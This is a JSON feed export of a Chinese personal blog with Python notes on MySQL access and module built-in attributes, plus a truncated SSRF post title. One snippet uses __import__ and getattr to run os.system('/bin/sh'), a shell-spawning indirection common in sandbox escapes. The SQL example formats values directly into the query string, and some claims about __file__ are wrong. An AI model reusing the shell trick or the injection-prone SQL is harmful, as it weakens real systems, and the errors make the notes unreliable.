{
    "version": "https://jsonfeed.org/version/1",
    "title": "1asy",
    "subtitle": "Till I no longer can",
    "icon": "https://self-ferry.github.io/images/favicon.ico",
    "description": "临渊羡鱼，不如退而结网",
    "home_page_url": "https://Self-ferry.github.io",
    "items": [
        {
            "id": "https://self-ferry.github.io/2021/02/07/%E5%88%9D%E8%AF%86python%E6%B5%8B%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/",
            "url": "https://self-ferry.github.io/2021/02/07/%E5%88%9D%E8%AF%86python%E6%B5%8B%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/",
            "title": "初识python测试驱动开发",
            "date_published": "2021-02-07T12:20:18.000Z",
            "content_html": "<p><span class=\"label success\">✔️来首音乐吧</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=\"]}]'></div></div>\n<h1 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h1>\n",
            "tags": []
        },
        {
            "id": "https://self-ferry.github.io/2021/02/07/python%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/",
            "url": "https://self-ferry.github.io/2021/02/07/python%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/",
            "title": "python数据库编程",
            "date_published": "2021-02-07T08:36:30.000Z",
            "content_html": "<p><span class=\"label success\">✔️来首音乐吧</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=464863017\"]}]'></div></div>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>在看《python 网络编程从入门到精通》，顺便做个笔记。</p>\n<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<p><ins>本章以 MySQL 为例说明</ins></p>\n<p>python 操作数据库主要涉及 connection 和 cursor 两个对象，操作流程图如下：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"connection对象\"><a class=\"anchor\" href=\"#connection对象\">#</a> connection 对象</h2>\n<p>connection 对象，与数据源唯一的会话，可以使用 connection 对象的集合、方法、属性实现与数据的连接。</p>\n<p><span class=\"label\">connection 参数列表</span></p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:left\">参数名</td>\n<td style=\"text-align:left\">类型</td>\n<td style=\"text-align:left\">说明</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">host</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接数据库服务器主机名，默认为本地主机 (localhost)</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">port</td>\n<td style=\"text-align:left\">数字</td>\n<td style=\"text-align:left\">MySQL 服务器端口号，默认是 3306</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">user</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接数据库的用户名</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">password</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接数据库的密码</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">db</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">数据库名称</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">charset</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接编码</td>\n</tr>\n</tbody>\n</table>\n<p><span class=\"label\">connection 方法列表</span></p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:left\">方法名</td>\n<td style=\"text-align:left\">说明</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">cursor()</td>\n<td style=\"text-align:left\">使用该连接创建并返回游标</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">commit()</td>\n<td style=\"text-align:left\">提交当前事务</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">rollback()</td>\n<td style=\"text-align:left\">回滚当前事务</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">close()</td>\n<td style=\"text-align:left\">关闭连接</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"cursor对象\"><a class=\"anchor\" href=\"#cursor对象\">#</a> cursor 对象</h2>\n<p>cursor 对象是游标对象，用户可以用它查询和获取结果。</p>\n<p><span class=\"label\">cursor 对象方法列表</span></p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:left\">方法名</td>\n<td style=\"text-align:left\">说明</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">execute</td>\n<td style=\"text-align:left\">执行一个数据库命令</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">fecthone</td>\n<td style=\"text-align:left\">取结果集下一行</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">fechmany(size)</td>\n<td style=\"text-align:left\">取结果集下几行</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">fechall()</td>\n<td style=\"text-align:left\">取结果集中剩余的所有行</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">rowcount</td>\n<td style=\"text-align:left\">最近一次 execute 返回数据的行数或影响行数</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">close()</td>\n<td style=\"text-align:left\">关闭游标对象</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"一个例子\"><a class=\"anchor\" href=\"#一个例子\">#</a> 一个例子</h2>\n<p>搬一个菜鸟教程里<ins>插入操作</ins>的例子。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> MySQLdb</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 打开数据库连接</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>db <span class=\"token operator\">=</span> MySQLdb<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"testuser\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"test123\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"TESTDB\"</span><span class=\"token punctuation\">,</span> charset<span class=\"token operator\">=</span><span class=\"token string\">'utf8'</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 使用 cursor () 方法获取操作游标 </span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>cursor <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># SQL 插入语句</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sql <span class=\"token operator\">=</span> \"INSERT INTO EMPLOYEE<span class=\"token punctuation\">(</span>FIRST_NAME<span class=\"token punctuation\">,</span> \\</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>       LAST_NAME<span class=\"token punctuation\">,</span> AGE<span class=\"token punctuation\">,</span> SEX<span class=\"token punctuation\">,</span> INCOME<span class=\"token punctuation\">)</span> \\</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>       VALUES <span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s <span class=\"token punctuation\">)</span>\" <span class=\"token operator\">%</span> \\</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>       <span class=\"token punctuation\">(</span><span class=\"token string\">'Mac'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Mohan'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'M'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token comment\"># 执行 sql 语句</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   cursor<span class=\"token punctuation\">.</span>execute<span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   <span class=\"token comment\"># 提交到数据库执行</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   db<span class=\"token punctuation\">.</span>commit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>   <span class=\"token comment\"># 发生错误时回滚</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>   db<span class=\"token punctuation\">.</span>rollback<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># 关闭数据库连接</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>db<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "python",
                "数据库编程"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/02/05/python%E6%A8%A1%E5%9D%97%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7/",
            "url": "https://self-ferry.github.io/2021/02/05/python%E6%A8%A1%E5%9D%97%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7/",
            "title": "python模块的内置属性",
            "date_published": "2021-02-05T12:59:31.000Z",
            "content_html": "<p><span class=\"label success\">✔️嘘，请安静</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=532950140\"]}]'></div></div>\n<h1 id=\"模块的内置属性\"><a class=\"anchor\" href=\"#模块的内置属性\">#</a> 模块的内置属性</h1>\n<p>对于任何一个 python 文件来说，当 python 解释器运行一个 py 文件，会自动将一些内容加载到内置的属性中；一个模块我们可以看做是一个比类更大的对象。</p>\n<h2 id=\"查看内置属性\"><a class=\"anchor\" href=\"#查看内置属性\">#</a> 查看内置属性</h2>\n<p>我们可以通过 dir () 方法获取该模块所有的显式或隐式属性。<br />\n附上 dir () 的介绍：<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*- coding:utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>doc......</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>var <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dir</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">####### 输出结果 #######</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'Test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__annotations__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__builtins__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__cached__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__doc__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__file__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__loader__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__name__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__package__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__spec__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'os'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'var'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><div class=\"note warning\">\n<p>这里有些内容不确定：<br />\n《python 网络编程从入门到精通》这本书上写原话是<br />\n <code>可以看到隐式属性有['Test', '__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'os', 'var']</code></p>\n<p>而在网上的<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3dwLWJnL3AvOTg1NjMzOS5odG1s\"> https://www.cnblogs.com/cwp-bg/p/9856339.html</span> 博客中这样写的<br />\n <code>可看到隐式的属性有__annotations__,__builtins__,__cached__,__annotations__,__doc__,__file__,__loader__,__name__;</code></p>\n</div>\n<p>我们打印一下每个魔法属性：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>doc......</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>var <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\"># print(dir())</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__annotations__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__builtins__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__cached__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__doc__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__loader__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__package__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__spec__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">######### 输出结果 ###############</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>__main__</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token operator\">&lt;</span>module <span class=\"token string\">'builtins'</span> <span class=\"token punctuation\">(</span>built<span class=\"token operator\">-</span><span class=\"token keyword\">in</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>doc<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>G<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>Text_Files<span class=\"token operator\">/</span>py<span class=\"token operator\">/</span><span class=\"token number\">1.</span>py</pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token operator\">&lt;</span>_frozen_importlib_external<span class=\"token punctuation\">.</span>SourceFileLoader <span class=\"token builtin\">object</span> at <span class=\"token number\">0x0000018C7E37F8B0</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">## 空行是打印时就有的</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\"># 其中__name__、__doc__、__file__、__package__是可以直接使用的，其它的内置属性一般不允许直接使用。</span></pre></td></tr></table></figure><h2 id=\"内置魔法属性\"><a class=\"anchor\" href=\"#内置魔法属性\">#</a> 内置魔法属性</h2>\n<ol>\n<li>\n<p>_<em>name</em>_<br />\n该属性代表当前模块的名字，每个 py 文件默认的属性，如果当前模块是主程序，值为 “<strong>main</strong>”，如果不是主程序，值为模块名。这个属性经常用来区分主程序和作为被导入模块的程序。</p>\n</li>\n<li>\n<p>_<em>builtins</em>_<br />\n该属性代表内置模块 builtins，即所有的内建函数、内置类型、内置异常等；在 python 执行一个 py 文件时，会将内置模块赋值给这个属性；如果不是主程序，那么这个属性是一个 builtins 模块所有方法的字典。</p>\n</li>\n<li>\n<p>_<em>doc</em>_<br />\n模块的说明文档，py 文件初始化时，将文件开始的说明字符串赋值给这个属性。</p>\n</li>\n<li>\n<p>_<em>file</em>_<br />\n该属性代表文件的绝对路径，任何一个模块使用这个属性就可获得本模块的绝对路径；但是该属性只在 windows 环境下可用，在 linux 环境下不可用。</p>\n</li>\n<li>\n<p>_<em>cached</em>_<br />\n缓存文件，如果是主程序，那么该属性为 None，其他模块的该属性指向该模块的 pyc 字节文件，这样在 py 文件不发生修改的情况下可以减少编译的时间，更快地加载上下文环境。</p>\n</li>\n<li>\n<p>_<em>annotations</em>_<br />\n该属性对于模块文件来说，没有开放给用户使用；但对于函数来说，这个方法用来记录参数的类型和返回值。</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_sum</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> x <span class=\"token operator\">+</span> y</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>get_sum<span class=\"token punctuation\">.</span>__annotations__<span class=\"token punctuation\">)</span> <span class=\"token comment\">#输出结果 &#123;&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_sum</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> x <span class=\"token operator\">+</span> y</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>get_sum<span class=\"token punctuation\">.</span>__annotations__<span class=\"token punctuation\">)</span> <span class=\"token comment\"># &#123;'y': &lt;class 'int'>, 'return': &lt;class 'int'>&#125;</span></pre></td></tr></table></figure><p>函数的参数和返回值如果在定义的时候指定了类型，那么它们就会以键值对的形式记录到函数的__annotations__属性中，但对于匿名函数来说，这个属性是不存在的。</p>\n<ol start=\"7\">\n<li>\n<p>_<em>loader</em>_<br />\n该属性 py3.3 之前没有，引用了本模块的加载器对象，即该模块的上下文是由这个加载器加载到内存中的。</p>\n</li>\n<li>\n<p>_<em>package</em>_<br />\n该属性是一个文件是否是包的标志，在主程序中该属性的值永远是 None，不要使用它；当一个包被导入到主程序中，该包的__package__属性为包的名字。</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># test</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>__init__<span class=\"token punctuation\">.</span>py</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># main.py</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> test</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">.</span>__package__<span class=\"token punctuation\">)</span> <span class=\"token comment\"># test</span></pre></td></tr></table></figure><ol start=\"9\">\n<li><em>spec</em><br />\n 该属性记录一个模块的详细信息，是一个 ModuleSpec 对象，</li>\n</ol>\n<h2 id=\"其他魔法属性\"><a class=\"anchor\" href=\"#其他魔法属性\">#</a> 其他魔法属性</h2>\n<ol>\n<li><em>author</em><br />\n 该属性用来定义模块的作者信息，可以是字符串，也可以是列表、字典等数据结构。</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 可以在 python 文件中加入</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>__author__ <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'auth'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'1asy'</span><span class=\"token punctuation\">;</span><span class=\"token string\">'bg'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'https://self-ferry.github.io/'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 或</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>__author__ <span class=\"token operator\">=</span> <span class=\"token string\">'1asy'</span></pre></td></tr></table></figure><ol start=\"2\">\n<li><em>all</em><br />\n 该属性不是模块默认的，需要手动定义，它的功能有二：</li>\n</ol>\n<p>记录一个模块有哪些重要的、对外开发的类、方法或变量等，或记录一个包哪些对外开放的模块；</p>\n<p>限制导入，当使用 <code>“from xxx import *”</code>  形式导入时，实际导入的只有__all__属性中的同名的对象而不是所有，但对于 <code>“from xxx import xxx”</code>  指定了具体的名字则 all 属性被忽略。</p>\n<h2 id=\"魔法方法\"><a class=\"anchor\" href=\"#魔法方法\">#</a> 魔法方法</h2>\n<h3 id=\"_import_\"><a class=\"anchor\" href=\"#_import_\">#</a> _<em>import</em>_</h3>\n<p>该魔法方法是 import 触发，即 <code>import os </code> 相当于 <code>os = __import__('os')</code> ，也可以直接使用，主要用于模块延迟加载，或重载模块。</p>\n<p><span class=\"label\">参数：</span><br />\nname: 模块的名字；<br />\nglobal: 包含全局变量的字典，采用默认值 global ()<br />\n local: 包含局部变量的字典，采用默认值 local ()<br />\n fromlist: 被导入的子模块的名称<br />\n level: 指定使用绝对导入还是相对导入，0 表示只执行绝对导入。</p>\n<p><span class=\"label\">实例</span></p>\n<p>这段代码能在 Linux 下调用 shell</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">loader</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    a <span class=\"token operator\">=</span> <span class=\"token builtin\">__import__</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    loader<span class=\"token punctuation\">(</span><span class=\"token string\">\"os\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"system\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>__import__函数返回的是一个变量，代表一个模块，所有后续方法的调用都要在这个变量的基础上。</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3dwLWJnL3AvOTg1NjMzOS5odG1s\">https://www.cnblogs.com/cwp-bg/p/9856339.html</span></p>\n",
            "tags": [
                "python",
                "python内置属性"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/02/01/web%E6%BC%8F%E6%B4%9E-SSRF/",
            "url": "https://self-ferry.github.io/2021/02/01/web%E6%BC%8F%E6%B4%9E-SSRF/",
            "title": "web漏洞-SSRF",
            "date_published": "2021-02-01T11:54:22.000Z",
